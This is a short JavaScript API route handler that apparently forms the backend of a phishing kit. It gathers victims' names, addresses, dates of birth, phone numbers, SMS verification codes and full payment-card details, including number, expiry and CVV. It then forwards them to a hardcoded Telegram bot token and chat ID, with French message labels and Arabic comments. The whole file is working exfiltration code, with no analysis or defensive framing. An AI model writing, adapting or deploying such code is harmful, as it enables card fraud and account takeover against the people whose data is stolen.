export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const { 
    first_name, 
    last_name, 
    email, 
    dob, 
    address, 
    postal, 
    city, 
    num, 
    sms_code,
    cc,
    exp,
    cvv,
  } = req.body;

  const BOT_TOKEN = "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcZqU18QM";
  const CHAT_ID = "-4982276528";

  let message = "";
  
  if  (cc && exp && cvv) {
    // 🟢 رسالة الكارت
    message = `
💳 Carte Bancaire:
- Numéro: ${cc}
- Expiration: ${exp}
- CVV: ${cvv}
    `;
  } else if (sms_code) {
    // 🟠 رسالة SMS
    message = `
📲 SMS Reçu:
- Code: ${sms_code}
- Nom: ${first_name} ${last_name}
- Numéro: ${num}
    `;
  } else {
    // 🔵 بيانات الفورم الأولية
    message = `
📨 Infos Formulaire:
- Nom: ${first_name} ${last_name}
- Email: ${email}
- Date: ${dob}
- Adresse: ${address}, ${city}, ${postal}
- Téléphone: ${num}
    `;
  }

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
    });

    res.status(200).json({ message: "✅ Envoyé avec succès" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
  }
}






